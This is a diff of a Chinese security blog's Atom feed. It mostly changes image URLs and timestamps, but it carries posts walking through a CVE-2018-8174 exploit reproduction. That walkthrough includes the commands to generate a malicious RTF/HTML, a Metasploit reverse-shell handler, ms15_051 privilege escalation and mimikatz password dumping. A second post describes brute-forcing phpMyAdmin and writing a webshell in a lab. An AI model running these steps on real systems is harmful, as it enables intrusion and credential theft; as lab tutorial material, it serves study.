@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-07-30T09:23:38.204Z</updated>
+  <updated>2018-12-18T15:14:14.927Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -20,18 +20,18 @@
     <link href="http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     <id>http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/</id>
     <published>2018-06-27T13:24:22.000Z</published>
-    <updated>2018-07-30T09:23:38.204Z</updated>
+    <updated>2018-12-18T15:14:14.927Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><a href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。" class="headerlink" title="&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。"></a>&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</h4><a id="more"></a>
 <h2 id="0x01-操作演示"><a href="#0x01-操作演示" class="headerlink" title="0x01. 操作演示"></a>0x01. 操作演示</h2><h4 id="1-下载EXP到kali-，生成木马文件，启动msf监听"><a href="#1-下载EXP到kali-，生成木马文件，启动msf监听" class="headerlink" title="1. 下载EXP到kali ，生成木马文件，启动msf监听"></a>1. 下载EXP到kali ，生成木马文件，启动msf监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git</div><div class="line">cd CVE-2018-8174_EXP/</div><div class="line">python CVE-2018-8174.py -u http://192.168.1.111/exploit.html -o exploit.rtf -i 192.168.1.111 -p 4444</div><div class="line">cp exploit.html /var/www/html/</div><div class="line">service apache2 start</div></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/shell/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">set lport 4444</div><div class="line">run</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180627203521_0U5ZDx_Screenshot.jpeg" alt=""></p>
-<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627203521_0U5ZDx_Screenshot.jpeg" alt=""></p>
+<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
 <h4 id="3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><a href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权" class="headerlink" title="3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权"></a>3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sessions -u 2</div><div class="line">use windows/local/ms15_051_client_copy_image</div><div class="line">set session 3</div><div class="line">run</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
 <h4 id="4-利用mimikatz-盗取明文密码"><a href="#4-利用mimikatz-盗取明文密码" class="headerlink" title="4. 利用mimikatz 盗取明文密码"></a>4. 利用mimikatz 盗取明文密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
-<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h3 id="emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"><a href="#emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！" class="headerlink" title="&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"></a>&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！</h3><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180730172001_BDALef_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
+<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h3 id="emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"><a href="#emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！" class="headerlink" title="&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"></a>&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！</h3><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180730172001_BDALef_Screenshot.jpeg" alt=""></p>
 ]]></content>
     
     <summary type="html">
@@ -48,10 +48,10 @@
     <link href="http://TimeS0ng.github.io/2018/06/04/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/"/>
     <id>http://TimeS0ng.github.io/2018/06/04/SQL注入导图/</id>
     <published>2018-06-04T03:06:52.000Z</published>
-    <updated>2018-06-04T03:10:11.817Z</updated>
+    <updated>2018-12-18T15:32:39.779Z</updated>
     
     <content type="html"><![CDATA[<h4 id="本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！"><a href="#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！" class="headerlink" title="本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！"></a>本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！</h4><a id="more"></a>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180604110147_oMGlv3_B11A99714D2D907A004073CD49DA4CB6.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/20180604110147_oMGlv3_B11A99714D2D907A004073CD49DA4CB6.jpeg" alt=""></p>
 ]]></content>
     
     <summary type="html">
@@ -68,45 +68,45 @@
     <link href="http://TimeS0ng.github.io/2018/06/04/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE-%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/"/>
     <id>http://TimeS0ng.github.io/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/</id>
     <published>2018-06-04T02:52:53.000Z</published>
-    <updated>2018-06-04T02:54:08.185Z</updated>
+    <updated>2018-12-18T15:11:57.423Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00. 引言"></a>0x00. 引言</h2><h4 id="emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"><a href="#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！" class="headerlink" title="&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"></a>&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。<a href="http://www.freebuf.com/articles/network/172578.html" target="_blank" rel="external">本文已投freebuf，禁止转载！</a></h4><a id="more"></a>
-<h2 id="0x01-渗透环境"><a href="#0x01-渗透环境" class="headerlink" title="0x01. 渗透环境"></a>0x01. 渗透环境</h2><h4 id="emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"><a href="#emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。" class="headerlink" title="&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"></a>&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。</h4><h4 id="emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："><a href="#emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：" class="headerlink" title="&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："></a>&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519102901_yt92TP_Screenshot.jpeg" alt=""></p>
-<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02. web渗透"></a>0x02. web渗透</h2><h4 id="emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"><a href="#emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！" class="headerlink" title="&emsp;&emsp;首先打开我们获取的web站点地址http://192.168.1.106 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"></a>&emsp;&emsp;首先打开我们获取的web站点地址<a href="http://192.168.1.106" target="_blank" rel="external">http://192.168.1.106</a> 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519103537_TL8yGs_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519104344_KmT5nJ_Screenshot.jpeg" alt=""></p>
-<h4 id="emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。"><a href="#emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。" class="headerlink" title="&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。"></a>&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。</h4><h4 id="emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"><a href="#emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。" class="headerlink" title="&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"></a>&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519105043_4G3NCI_Screenshot.jpeg" alt=""></p>
-<h4 id="emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。"><a href="#emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。" class="headerlink" title="&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。"></a>&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519110155_HASASl_Screenshot.jpeg" alt=""></p>
-<h4 id="拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"><a href="#拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。" class="headerlink" title="拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"></a>拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519110834_n7WMwd_Screenshot.jpeg" alt=""></p>
+<h2 id="0x01-渗透环境"><a href="#0x01-渗透环境" class="headerlink" title="0x01. 渗透环境"></a>0x01. 渗透环境</h2><h4 id="emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"><a href="#emsp-emsp-此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。" class="headerlink" title="&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。"></a>&emsp;&emsp;此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。</h4><h4 id="emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："><a href="#emsp-emsp-我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1-1-1-21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：" class="headerlink" title="&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下："></a>&emsp;&emsp;我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519102901_yt92TP_Screenshot.jpeg" alt=""></p>
+<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02. web渗透"></a>0x02. web渗透</h2><h4 id="emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"><a href="#emsp-emsp-首先打开我们获取的web站点地址http-192-168-1-106-可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！" class="headerlink" title="&emsp;&emsp;首先打开我们获取的web站点地址http://192.168.1.106 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！"></a>&emsp;&emsp;首先打开我们获取的web站点地址<a href="http://192.168.1.106" target="_blank" rel="external">http://192.168.1.106</a> 可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519103537_TL8yGs_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519104344_KmT5nJ_Screenshot.jpeg" alt=""></p>
+<h4 id="emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。"><a href="#emsp-emsp-爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots-txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test-php、phpmyadmin-其他地址基本都是静态或者用不了。" class="headerlink" title="&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。"></a>&emsp;&emsp;爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/ 其他地址基本都是静态或者用不了。</h4><h4 id="emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"><a href="#emsp-emsp-在test-php下面有管理员用于测试使用过的phpinfo-，通过它我们搜集到网站的根目录-G-apm-apache2-htdocs-还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。" class="headerlink" title="&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。"></a>&emsp;&emsp;在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录 G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519105043_4G3NCI_Screenshot.jpeg" alt=""></p>
+<h4 id="emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。"><a href="#emsp-emsp-进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin-这一个页面了，所以必须拿下，不然就无法进行后续操作。" class="headerlink" title="&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。"></a>&emsp;&emsp;进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110155_HASASl_Screenshot.jpeg" alt=""></p>
+<h4 id="拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"><a href="#拿到账号密码之后直接登陆上去利用-INTO-OUTFIEL-写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。" class="headerlink" title="拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。"></a>拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被–secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519110834_n7WMwd_Screenshot.jpeg" alt=""></p>
